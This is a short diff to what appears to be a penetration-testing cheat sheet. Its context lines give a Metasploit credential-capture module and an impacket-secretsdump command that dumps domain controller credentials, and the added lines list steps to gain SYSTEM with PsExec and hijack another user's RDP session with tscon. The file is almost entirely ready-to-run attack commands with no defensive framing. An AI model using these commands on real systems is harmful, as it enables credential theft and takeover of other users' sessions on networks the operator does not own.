@@ -40,3 +40,14 @@ use auxiliary/server/capture/http_basic
 ********************************************
 
 impacket-secretsdump -just-dc -no-pass <dc_name>\$@<dc_host_IP>
+
+********************************************
+********** Use other RDP session ***********
+********************************************
+
+1. Logon wia RDP to server;
+2. Run cmd as administrator;
+3 Run
+    PsExec64.exe -s cmd.exe
+4. Hijack other rdp session(above Windows Server 2019)
+    tscon 3 /dest:rdp-tcp#6
